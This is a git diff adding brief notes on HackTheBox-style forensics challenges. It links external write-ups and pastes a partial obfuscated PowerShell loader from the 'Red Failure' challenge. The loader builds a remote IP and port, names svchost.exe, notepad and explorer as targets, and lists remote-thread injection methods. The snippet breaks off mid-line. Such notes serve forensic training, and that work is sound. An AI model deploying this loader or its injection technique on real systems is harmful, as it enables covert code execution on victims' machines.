@@ -108,4 +108,41 @@ and we get the flag
 
 Our SOC has identified numerous phishing emails coming in claiming to have a document about an upcoming round of layoffs in the company. The emails all contain a link to diagnostic.htb/layoffs.doc. The DNS for that domain has since stopped resolving, but the server is still hosting the malicious document (your docker). Take a look and figure out what's going on.
 
+# Red Failure
+
+https://blog.ericturner.it/2022/03/02/hackthebox-forensics-challenge-red-failure/
+
+http request 
+
+```
+  sV  ("{0}{1}" -f'Y','uE51') ([typE]("{5}{0}{2}{3}{1}{4}"-f 'STeM','EcTIOn.aS','.REF','L','SemblY','Sy'));  ${a} = ("{0}{1}{2}{3}{4}" -f 'cu','rr','en','tth','read')
+${B} = ("{1}{0}{3}{2}" -f '.182.1','147','89','72.1')
+${C} = 80
+${D} = ("{2}{0}{1}" -f '.dl','l','user32')
+${E} = ("{1}{0}" -f 'tVI0','9')
+${f} = (('z6'+'4&Rx27Z{0}B%'+'7'+'3u'+'p')  -F[cHar]36)
+${g} = ((("{8}{5}{3}{1}{2}{0}{7}{4}{6}"-f '2','owsf3h','System3','d','svcho','Win','st.exe','f3h','C:f3h'))."r`EPlAcE"('f3h',[StRINg][ChaR]92))
+${h} = ("{0}{1}"-f 'notepa','d')
+${I} = ("{1}{0}"-f'xplorer','e')
+${j} = ("{1}{0}{2}" -f'_','msvcp','win.dll')
+${k} = ("{0}{1}" -f 'Tru','e')
+${l} = ("{1}{0}" -f'rue','T')
+
+${Me`Th`ODS} = @(("{1}{0}{2}{3}"-f'ot','rem','et','hread'), ("{2}{0}{1}{3}" -f'mo','tethre','re','addll'), ("{4}{2}{1}{3}{0}" -f'view','hr','otet','ead','rem'), ("{1}{3}{2}{4}{0}"-f 'ed','rem','e','ot','threadsuspend'))
+if (${m`E`ThOdS}.("{0}{1}{2}"-f'C','ontain','s').Invoke(${A})) {
+    ${h} = (&("{1}{0}{2}{3}" -f'tart
+```
+
+104.208.16.94	onedsblobprdcus16.centralus.cloudapp.azure.com
+
+# Siezed
+
+https://ctftime.org/writeup/33938
+
+# persistence
+
+https://ctftime.org/writeup/33938
+
+
+
 
